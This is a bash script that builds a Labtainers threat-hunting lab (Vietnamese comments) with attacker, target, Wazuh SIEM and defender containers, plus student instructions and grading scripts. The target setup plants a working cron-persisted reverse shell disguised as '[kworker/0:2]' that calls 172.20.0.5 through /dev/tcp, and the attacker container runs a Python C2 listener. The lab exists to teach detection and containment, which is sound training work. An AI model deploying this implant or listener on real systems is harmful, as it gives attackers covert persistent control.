#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-threathunt (Reverse shell + Threat Hunting) tren VM Labtainers.
# Chay tren VM:  bash install-soc-threathunt.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-threathunt
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-threathunt
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong C2 listener ngam,
# tach hoan toan khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid python3 /home/ubuntu/listen.py >/home/ubuntu/c2.log 2>&1 < /dev/null &
exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/listen.py" <<'__EOF_TH_7k2m__'
#!/usr/bin/env python3
# C2 listener: nghe cong C2PORT, GHI LOG moi ket noi reverse shell goi ve,
# va GIU ket noi mo (de phia phong thu thay ket noi ESTABLISHED khi dieu tra).
import socket
import threading
import time

HOST = "0.0.0.0"
PORT = C2PORT  # ca nhan hoa qua RAND_REPLACE

def handle(conn, addr):
    print(time.strftime("%Y-%m-%d %H:%M:%S"), "CONNECT from", addr, flush=True)
    try:
        conn.sendall(b"id\n")          # gui 1 lenh (mo phong C2 ra lenh)
        while True:
            data = conn.recv(4096)     # giu ket noi, doc output shell
            if not data:
                break
    except Exception:
        pass
    finally:
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "DISCONNECT", addr, flush=True)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(5)
print(time.strftime("%Y-%m-%d %H:%M:%S"), "C2 listening on", PORT, flush=True)

while True:
    try:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except Exception:
        time.sleep(1)
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_TH_7k2m__'
SOC Lab - Threat Hunting: San -> Phat hien -> Ung pho.
May target bi cai implant C2 nguy trang (beacon ve may tan cong), lan giua cac ket noi lanh tinh.
Nhiem vu 3 pha: (1) SAN ra cai doc giua nhieu + bao cao IOC (C2 IP + cong ca nhan hoa + tien trinh);
(2) PHAT HIEN - tu viet luat Wazuh bat beacon; (3) UNG PHO phau thuat - chan dung IP C2 ma khong
lam dut dich vu giam sat lanh tinh (SLA).
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_TH_7k2m__'
# parameter.config - ca nhan hoa (chong chep bai)
# Moi sinh vien co CONG C2 khac nhau -> ket noi reverse shell toi 172.20.0.5:<cong khac nhau>.
# Token C2PORT thay bang so ngau nhien trong CA target (script doc) LAN attacker (listener)
# => dung mot gia tri cho ca hai. Grading van tinh (match 172.20.0.5:<bat ky cong nao>).
C2PORT : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:listen.py : C2PORT : 20000 : 65000
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_TH_7k2m__'
# start.config - Lab soc-threathunt v2 (Threat Hunting: San -> Phat hien -> Ung pho)
# target bi cai implant C2 nguy trang (beacon ve attacker). SV: SAN giua nhieu -> VIET LUAT Wazuh
# bat beacon -> CHAN C2 phau thuat (khong lam dut giam sat lanh tinh).

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-threathunt_student_master_seed
	GRADE_CONTAINER target

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: bi nhiem san, noi sinh vien dieu tra + go bo ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: C2 listener, chay ngam (TERMINALS 0 = "hidden") ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, co Firefox de xem dashboard Wazuh ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_TH_7k2m__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.attacker.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - attacker (C2 listener, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# python3 de chay C2 listener (socket trong thu vien chuan, khong can pip)
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.defender.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.siem.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.target.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - target (bi nhiem san reverse shell + Wazuh agent)
#
ARG registry
# Base co san openssh-server (sshd) + rsyslog -> giu de analyst SSH sang
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cho prestop/analyst chay sudo khong mat khau mot so lenh dieu tra
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/crontab, /bin/crontab, /usr/bin/cat, /bin/cat, /usr/sbin/ss, /sbin/ss, /bin/ss, /usr/bin/stat, /bin/stat, /sbin/iptables, /usr/sbin/iptables' > /etc/sudoers.d/labtainer-hunt \
    && chmod 440 /etc/sudoers.d/labtainer-hunt
#
# cron (persistence) + iproute2 (ss) cho dieu tra + iptables (ung pho chan C2)
RUN apt-get update && apt-get install -y --no-install-recommends cron iproute2 iptables \
    && rm -rf /var/lib/apt/lists/* || true
#
# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
RUN systemctl enable cron 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_TH_7k2m__'
================================================================================
 SOC LAB: THREAT HUNTING - SAN -> PHAT HIEN -> UNG PHO (Wazuh SIEM)
================================================================================

1. TONG QUAN (OVERVIEW)
--------------------------------------------------------------------------------
May 'target' da bi cai mot IMPLANT C2 chay ngam: dinh ky "goi ve" may tan cong
(C2, 172.20.0.5) qua mot cong LA, tien trinh duoc NGUY TRANG cho giong tien trinh he thong.
Quanh no con co cac ket noi/tien trinh LANH TINH (nhieu). Ban KHONG duoc cho biet truoc IOC -
phai TU SAN ra giua dong nhieu. Day la 3 ky nang SOC noi tiep nhau:
  (1) SAN (hunting) - tu tim ra cai doc; (2) PHAT HIEN (detection engineering) - tu viet luat
  Wazuh de he thong tu canh bao; (3) UNG PHO - cat dut C2 mot cach CHINH XAC, khong lam hong
  dich vu lanh tinh.

*** Lan dau cho siem cai Wazuh (~8-10'):  tail -f /var/log/wazuh-install.log ***

2. MUC TIEU HOC TAP (OBJECTIVES)
--------------------------------------------------------------------------------
  - Phan biet hoat dong DOC voi LANH TINH dua tren hanh vi (beacon dinh ky, dich/cong la,
    tien trinh nguy trang) - khong chi "thay ket noi ra ngoai la chan".
  - Tu viet luat phat hien (Wazuh custom rule) + kiem thu bang wazuh-logtest.
  - Ung pho PHAU THUAT: chan dung cai doc ma khong lam gian doan giam sat/dich vu that.

3. KIEN THUC NEN (BACKGROUND)
--------------------------------------------------------------------------------
* Reverse shell / C2 beacon: may nan nhan CHU DONG ket noi ra may ke tan cong theo chu ky
  ("beacon"), tao kenh dieu khien. Dau hieu san: ket noi ra mot host/cong bat thuong, lap lai
  deu dan; tien trinh dang ngo (ten gia danh tien trinh he thong nhung lai co ket noi mang).
* Nguy trang (masquerading): malware thuong dat ten giong tien trinh that (vd '[kworker/...]',
  'sysmon', 'update'...). Tien trinh nhan kernel that KHONG co ket noi mang - do la cach phan biet.
* Wazuh custom rule: them luat vao /var/ossec/etc/rules/local_rules.xml tren SIEM (id >= 100000),
  dung <match>/<regex>/<program_name> de khop dong log; test bang `wazuh-logtest` (dan 1 dong log
  vao, xem luat co khop + level); nap luat bang `systemctl restart wazuh-manager`.
* MITRE ATT&CK lien quan: T1053 (Scheduled Task/cron - persistence), T1059 (Command/Shell),
  T1071 (Application Layer Protocol - C2). Dashboard Wazuh co module MITRE de doi chieu.
* Ung pho phau thuat: chan DUNG IP C2 (tuong lua theo -d <ip>) thay vi "drop het egress" (se cat
  luon ket noi Wazuh agent -> mu giam sat). Cat mau dung cho, giu dich vu that song.

4. MOI TRUONG & SO DO (TOPOLOGY)
--------------------------------------------------------------------------------
  attacker (172.20.0.5, AN)  -- C2 listener (noi implant goi ve)
  target   (172.20.0.10)     -- may nhiem; co Wazuh agent + log giam sat /var/log/netmon.log
  siem     (172.20.0.20)     -- Wazuh (dashboard https://172.20.0.20) + noi ban VIET LUAT
  defender (172.20.0.30)     -- tram cua ban: Firefox + SSH
  Dang nhap target de dieu tra:  ssh analyst@target   (mat khau: analyst)

5. NHIEM VU (TASKS)
--------------------------------------------------------------------------------
--- PHA 1: SAN (tim ra cai doc giua nhieu) ---
  a. Dashboard Wazuh (admin / tren siem: sudo cat /root/wazuh-admin-credentials.txt):
     - Integrity Monitoring (FIM): co FILE LA bi them/sua o dau? (goi y: thu muc nhi phan he thong,
       thu muc cron, /tmp).
     - Xem log giam sat ket noi (Threat Hunting / Security events): co dong ket noi (netmon) nao ra
       mot dich DANG NGO khong? Phan biet dich LANH TINH (may SIEM) voi dich LA.
  b. Tren target (ssh analyst@target), xac nhan bang cong cu he thong:
     - Liet ke ket noi dang mo + tien trinh so huu (goi y: cong cu liet ke socket, co kem tien trinh).
     - Chu y tien trinh NGUY TRANG: ten giong tien trinh he thong nhung co ket noi mang.
  c. Ghi vao /home/analyst/findings.txt: C2_IP, C2_PORT (cong cua MAY BAN - tu san), MAL_PROC
     (ten tien trinh doc), MAL_SCRIPT (duong dan implant).

--- PHA 2: PHAT HIEN (tu viet luat Wazuh) ---
  Tren SIEM (ssh/terminal siem), sua /var/ossec/etc/rules/local_rules.xml, THEM mot luat (id >= 100000)
  khop dong log beacon toi C2 va dat level canh bao. Khung vi du (tu dien IP C2 BAN da tim):
      <group name="local,threat_hunt,">
        <rule id="100200" level="12">
          <match>netmon: conn dst=&lt;IP_C2_BAN_TIM&gt;</match>
          <description>C2 beacon detected</description>
          <group>c2_detected,</group>
        </rule>
      </group>
  - Kiem thu: `/var/ossec/bin/wazuh-logtest`  (dan 1 dong netmon tu /var/log/netmon.log -> xem luat
    co khop + dung level khong).
  - Nap luat: `sudo systemctl restart wazuh-manager`.
  - Xac nhan: tren dashboard (Security events) thay canh bao tu luat cua ban no len.
  *** Lam PHA 2 KHI beacon con hoat dong (truoc khi chan) de luat co du lieu ma no. ***

--- PHA 3: UNG PHO PHAU THUAT ---
  - CHAN dung IP C2 o tang mang (goi y: luat tuong lua chan theo dia chi dich la IP C2).
  - KHONG chan bua (vd drop toan bo egress) -> se cat luon ket noi Wazuh agent toi SIEM (172.20.0.20)
    va lam mu giam sat (TRUOT SLA).
  - Kiem chung: luat iptables chan 172.20.0.5 da co (sudo iptables -S | grep 172.20.0.5);
    ket noi toi 172.20.0.20 (SIEM) VAN con. (Luu y: ket noi .5 dang ESTABLISHED co the con hien
    vai phut cho den khi TCP timeout - cham diem theo LUAT chan, khong theo so ket noi.)

6. NOP BAI (SUBMISSION)
--------------------------------------------------------------------------------
  checkwork -> tu kiem tra ; stoplab -> nop bai.
  Cac muc cham (chi cham VIEC BAN LAM):
    - reported       : dung C2 IP + CONG ca nhan hoa + ten tien trinh doc.
    - detection_rule : luat Wazuh tu viet NO canh bao tren beacon.
    - contained      : da CHAN IP C2 (172.20.0.5) bang iptables.
    - sla_ok         : dich vu giam sat lanh tinh (ket noi toi SIEM) van song (khong chan bua).
    - incident_resolved : xay duoc phat hien + cat C2 + khong lam hong dich vu lanh tinh.
__EOF_TH_7k2m__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_TH_7k2m__'
# goals.config - Threat Hunting v2 (San -> Phat hien -> Ung pho)
# Chi cham VIEC SINH VIEN LAM (bo threat_detected/agent_connected vi chung tu Y khi lab chay).

# PHA 1 - SAN: bao cao dung IOC (C2 IP + CONG ca nhan hoa + ten tien trinh doc)
reported       = boolean : ( _marker and _rep_ip and _rep_port and _rep_proc )
# PHA 2 - PHAT HIEN: luat Wazuh tu viet NO canh bao tren beacon
detection_rule = boolean : _detection
# PHA 3 - UNG PHO: da chan IP C2 (.5) bang iptables
contained      = boolean : ( _marker and _contained )
# PHA 3 (SLA): khong chan bua - dich vu giam sat lanh tinh (.20) van song
sla_ok         = boolean : ( _marker and _sla )

# MUC TIEU TONG: xay duoc phat hien + chan dut C2 + KHONG lam hong dich vu lanh tinh
incident_resolved = boolean : ( _marker and _detection and _contained and _sla )
__EOF_TH_7k2m__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_TH_7k2m__'
# results.config - Threat Hunting v2 (San -> Phat hien -> Ung pho)
# Chi cham VIEC SINH VIEN LAM; prestop chi in co/OK, khong lo IOC.

# --- target ---
_marker    = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Containment: da chan IP C2 (.5) bang iptables chua?
_contained = target:prestop.stdout : FILE_REGEX : CONTAINED
# SLA: ket noi lanh tinh toi SIEM (.20) con song?
_sla       = target:prestop.stdout : FILE_REGEX : SLA_OK
# Bao cao: C2 IP + CONG ca nhan hoa + ten tien trinh doc
_rep_ip    = target:prestop.stdout : FILE_REGEX : REP_IP_OK
_rep_port  = target:prestop.stdout : FILE_REGEX : REP_PORT_OK
_rep_proc  = target:prestop.stdout : FILE_REGEX : REP_PROC_OK

# --- siem: luat phat hien cua SV co no canh bao tren beacon khong? ---
_detection = siem:prestop.stdout : FILE_REGEX : DETECTION_OK

# --- Goi y checkwork ---
#CHECK_TRUE: Chua CHAN C2 - hay chan DUNG IP C2 (iptables ... -d 172.20.0.5 -j DROP). Ket noi ESTABLISHED con dinh se tu timeout.
cw_contained = target:prestop.stdout : FILE_REGEX : CONTAINED
#CHECK_TRUE: Ket noi lanh tinh toi SIEM (172.20.0.20) phai CON - dung chan bua (drop het egress) lam dut giam sat.
cw_sla = target:prestop.stdout : FILE_REGEX : SLA_OK
#CHECK_TRUE: Chua viet duoc luat Wazuh bat beacon. Them rule vao local_rules.xml (id>=100000) match 'netmon: conn dst=172.20.0.5', test wazuh-logtest, restart wazuh-manager.
cw_det = siem:prestop.stdout : FILE_REGEX : DETECTION_OK
#CHECK_TRUE: Chua bao cao du IOC (C2 IP + CONG ca nhan hoa + ten tien trinh) trong /home/analyst/findings.txt.
cw_rep = target:prestop.stdout : FILE_REGEX : REP_PORT_OK
__EOF_TH_7k2m__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay luc checkwork/stoplab tren siem. Cham PHA 2 (detection engineering):
# Wazuh chi ghi ALERT khi co RULE khop. Khong built-in rule nao biet toi /var/log/netmon.log,
# nen neu alerts.log co dong 'netmon: conn dst=172.20.0.5' => chac chan LUAT CUA SV da no.
# Chi in co/OK, khong dump IOC.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_SIEM"
sudo -n grep -aE 'netmon: conn dst=172\.20\.0\.5' /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -q . && echo "DETECTION_OK"

exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay LAN DAU tren target, quyen 'ubuntu'. $1 = mat khau sudo.
# Gieo implant C2 nguy trang + log giam sat ket noi (/var/log/netmon.log) cho detection engineering.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }

# ===== 1) Implant beacon (nguy trang 'sysmon') - cron moi phut =====
cat > /tmp/.sysmon <<'SH'
#!/bin/bash
# "sysmon" - thuc chat la beacon C2 nguy trang (persistence). Cron chay moi phut.
exec 2>/dev/null
# (a) LUON ghi su kien beacon vao log giam sat (cho detection) - moi lan chay, doc lap ket noi
printf '%s %s netmon: conn dst=172.20.0.5 dport=C2PORT proc=kworker-helper\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" >> /var/log/netmon.log
# (b) Giu DUY NHAT mot ket noi reverse shell; nguy trang ten tien trinh = [kworker/0:2]
exec 9>/tmp/.beacon.lock
flock -n 9 || exit 0
touch /tmp/.c2beacon
exec -a "[kworker/0:2]" bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
SH
S cp /tmp/.sysmon /usr/local/bin/.sysmon
S chmod 755 /usr/local/bin/.sysmon
S chown root:root /usr/local/bin/.sysmon

# ===== 2) Monitor ket noi (sinh dong lanh tinh lam nhieu + xac nhan .5 khi con ket noi) =====
cat > /tmp/netmon <<'SH'
#!/bin/bash
exec 2>/dev/null
ss -tn state established 2>/dev/null | tail -n +2 | awk '{print $NF}' | while read peer; do
  ip=${peer%:*}; port=${peer##*:}
  case "$ip" in ""|127.*|0.0.0.0|::*|*[!0-9.]*) continue;; esac
  printf '%s %s netmon: conn dst=%s dport=%s proc=monitor\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" "$ip" "$port" >> /var/log/netmon.log
done
SH
S cp /tmp/netmon /usr/local/bin/netmon
S chmod 755 /usr/local/bin/netmon
S bash -c ': > /var/log/netmon.log; chmod 644 /var/log/netmon.log'

# ===== 3) Persistence: cron moi phut (quyen root) =====
S bash -c 'printf "%s\n%s\n" "* * * * * root /usr/local/bin/.sysmon" "* * * * * root /usr/local/bin/netmon" > /etc/cron.d/sysmon; chmod 644 /etc/cron.d/sysmon'
S service cron restart 2>/dev/null || S systemctl restart cron 2>/dev/null || true
S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true

# (Khong can ground-truth root: cong C2 ca nhan hoa duoc prestop doc lai tu chinh dong beacon
#  trong /var/log/netmon.log luc cham diem.)

# ===== 4) Wazuh agent: giam sat netmon.log (cho SV viet luat) + FIM (cho san qua dashboard) =====
LF='<localfile><log_format>syslog</log_format><location>/var/log/netmon.log</location></localfile>'
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/usr/local/bin,/etc/cron.d,/tmp</directories>'
S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# ===== 6) analyst cho DEFENDER SSH sang dieu tra =====
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO SAN MOI DE DOA (Threat Hunting) - dien gia tri ban TU TIM DUOC (KEY=value):
# C2_IP      : dia chi may tan cong (C2)
# C2_PORT    : cong C2 (moi may mot khac - tu san ra)
# MAL_PROC   : ten tien trinh doc (nguy trang)
# MAL_SCRIPT : duong dan script/implant doc
C2_IP=
C2_PORT=
MAL_PROC=
MAL_SCRIPT=
FND
S cp /tmp/findings.txt /home/analyst/findings.txt
S chown analyst:analyst /home/analyst/findings.txt
S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/prestop" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (cham diem).
# Chi in co/OK, KHONG lo IOC (IP/cong/ten) -> tranh SV doc prestop.stdout de chep dap an.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

# Containment: da CHAN IP C2 (.5) bang iptables chua? -> chan la hanh dong containment.
# (Cham theo LUAT, khong dem ket noi 'ss': iptables DROP de ket noi ESTABLISHED con dinh
#  vai phut cho timeout -> dem ket noi se bao sai 'chua chan' du SV da chan dung.)
sudo -n iptables -S 2>/dev/null | grep -qE '172\.20\.0\.5(/32)?.*-j (DROP|REJECT)' && echo "CONTAINED"

# SLA: ket noi lanh tinh toi SIEM (.20) con song? (khong chan bua lam dut giam sat)
SL=$(ss -tn 2>/dev/null | grep -c '172.20.0.20:')
[ "${SL:-0}" -ge 1 ] && echo "SLA_OK"

# Bao cao IOC (chi in OK). Cong ky vong lay tu CHINH dong beacon trong log giam sat
